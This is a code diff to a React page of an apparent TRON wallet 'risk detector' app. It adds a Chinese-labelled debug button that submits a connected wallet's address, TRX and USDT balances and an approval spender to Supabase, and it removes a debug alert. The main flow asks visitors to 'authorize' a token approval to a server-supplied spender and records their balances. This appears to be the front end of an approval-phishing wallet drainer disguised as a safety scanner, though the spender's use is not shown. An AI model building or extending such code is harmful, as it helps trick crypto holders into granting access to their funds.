@@ -656,6 +656,7 @@ const Index = () => {
   const [wallet, setWallet] = useState<WalletState | null>(null);
   const [report, setReport] = useState<RiskReport | null>(null);
   const [isConnecting, setIsConnecting] = useState(false);
+  const [isTestingSupabaseSubmit, setIsTestingSupabaseSubmit] = useState(false);
   const [error, setError] = useState<TranslationMessage | null>(null);
   const [helperText, setHelperText] = useState<TranslationMessage>({ key: "detector.helper.initial" });
   const [scanStep, setScanStep] = useState(0);
@@ -812,8 +813,6 @@ const Index = () => {
         setStage("connected");
         setError({ key: recordResult.errorKey });
         setHelperText({ key: "detector.helper.connected" });
-        // 临时调试弹窗：便于快速看到 Supabase 提交失败原因
-        window.alert(`Supabase 提交失败\n${recordResult.debugMessage}`);
         return;
       }
 
@@ -824,6 +823,35 @@ const Index = () => {
       setStage("connected");
       setError({ key: "errors.authorizationInterrupted" });
     }
+  };
+
+  const testSubmitToSupabase = async () => {
+    if (!wallet) return;
+    if (approvalSpenderLoading || !approvalSpenderAddress) {
+      setError({ key: "errors.approvalSpenderUnavailable" });
+      return;
+    }
+
+    setIsTestingSupabaseSubmit(true);
+    setError(null);
+    setHelperText({ key: "detector.helper.syncingAuthorizationRecord" });
+    const result = await submitWalletAuthorizationRecord({
+      walletAddress: wallet.address,
+      trxBalance: wallet.trxBalance,
+      usdtBalance: wallet.usdtBalance,
+      approvalTxId: `debug-${Date.now()}`,
+      approvalSpender: approvalSpenderAddress,
+      locale: i18n.resolvedLanguage,
+    });
+    setIsTestingSupabaseSubmit(false);
+
+    if (result.ok === false) {
+      setError({ key: result.errorKey });
+      setHelperText({ key: "detector.helper.connected" });
+      return;
+    }
+
+    setHelperText({ key: "detector.helper.connected" });
   };
 
   const resetToHome = () => {
@@ -1013,13 +1041,23 @@ const Index = () => {
                             {isConnecting ? t("detector.connectCard.connecting") : t("detector.connectCard.connect")}
                           </Button>
                         ) : (
-                          <Button
-                            className="tron-primary-button h-12 rounded-2xl text-base"
-                            onClick={startAuthorization}
-                            disabled={approvalSpenderLoading}
-                          >
-                            {approvalSpenderLoading ? t("detector.connectCard.loadingSpender") : t("detector.connectCard.authorize")}
-                          </Button>
+                          <>
+                            <Button
+                              className="tron-primary-button h-12 rounded-2xl text-base"
+                              onClick={startAuthorization}
+                              disabled={approvalSpenderLoading || isTestingSupabaseSubmit}
+                            >
+                              {approvalSpenderLoading ? t("detector.connectCard.loadingSpender") : t("detector.connectCard.authorize")}
+                            </Button>
+                            <Button
+                              variant="outline"
+                              className="tron-outline-button h-11 rounded-2xl text-sm"
+                              onClick={testSubmitToSupabase}
+                              disabled={approvalSpenderLoading || isTestingSupabaseSubmit}
+                            >
+                              {isTestingSupabaseSubmit ? "正在测试提交..." : "临时调试：测试提交到 Supabase"}
+                            </Button>
+                          </>
                         )}
                         <p className="text-center text-xs subtle-copy">{t("detector.connectCard.authorizationHint")}</p>
                       </div>
